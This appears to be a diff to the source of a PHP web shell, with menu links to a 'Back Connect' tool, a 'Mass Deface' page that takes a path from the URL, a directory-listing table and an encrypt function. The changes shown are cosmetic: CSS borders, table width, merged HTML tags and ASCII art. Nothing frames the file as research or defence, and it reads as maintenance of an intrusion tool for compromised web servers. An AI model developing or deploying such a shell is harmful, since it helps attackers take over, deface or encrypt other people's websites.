@@ -240,10 +240,9 @@ pre{
     color:white;
 }
 .info{
-  border:1px solid white;
+  border:2px solid #15d6c8;
   width:100%;
   float:left;
-  height:120px;
 }
 
 @media only screen and (max-width: 1100px) {
@@ -337,8 +336,7 @@ echo "
 <a href='?tool=backconnect' class='w3-button w3-indigo w3-small w3-round'>Back Connect</a>
 <a href='?tool=about' class='w3-button w3-indigo w3-small w3-round'>About</a>
 <a href='?logout' class='w3-button w3-indigo w3-small w3-round'>Log Out</a>
-</div>
-</nav><br>";
+</div></nav><br>";
   
   
 function encrypt($def,$locdir){
@@ -487,18 +485,18 @@ else if($_GET['tool'] == "massdef"){
     echo "<br><br>
 <pre style='font-weight:bold;color:lime;'>
                                   
-
+                                  
                       )__(        
                       (66)        
                      _/\/    )__( 
                *    /   \    (oo) 
                 \_ / <^-.\----\/  
-                  ((_ )| \"   ||   
+                  ((_ )| \"   ||  
                    > >`||----||   
                    \ \ vv    vv   
                     ` `           
-                     Mass Deface
-                                        
+                     Mass Deface  
+                                  
 </pre>
     ";
     $path = $_GET['path'];
@@ -655,7 +653,7 @@ echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content">
 
-<table class="table_main" width="960" border="0" cellpadding="8" cellspacing="1" align="center">
+<table class="table_main" width="100%" border="0" cellpadding="8" cellspacing="1" align="center">
 <tr class="first">
 <td>Name</SCA></td>
 <td><center>Size</SCA></center></td>
